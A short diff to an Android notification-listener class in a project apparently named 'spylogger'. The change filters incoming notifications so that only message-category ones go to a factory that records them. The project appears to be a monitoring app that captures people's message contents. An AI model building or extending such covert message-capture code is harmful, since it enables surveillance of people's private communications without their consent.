@@ -1,5 +1,6 @@
 package com.gravatasufoca.spylogger.receivers;
 
+import android.app.Notification;
 import android.content.Context;
 import android.content.Intent;
 import android.os.IBinder;
@@ -26,7 +27,9 @@ public class NotificationMonitor extends NotificationListenerService {
     @Override
 
     public void onNotificationPosted(StatusBarNotification sbn) {
-        MensagemNotificationFactory.build(context,sbn);
+        if(sbn.getNotification().category.equals(Notification.CATEGORY_MESSAGE)) {
+            MensagemNotificationFactory.build(context, sbn);
+        }
     }
 
     @Override
